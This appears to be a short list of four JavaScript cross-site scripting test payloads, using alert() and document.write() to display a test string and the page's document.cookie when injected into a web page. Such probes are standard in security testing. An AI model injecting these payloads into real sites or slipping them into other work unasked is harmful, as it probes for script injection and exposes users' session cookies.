alert("XSS TEST");
alert(document.cookie);
document.write('document.write("XSS TEST")');
document.write('document.write(document.cookie)');
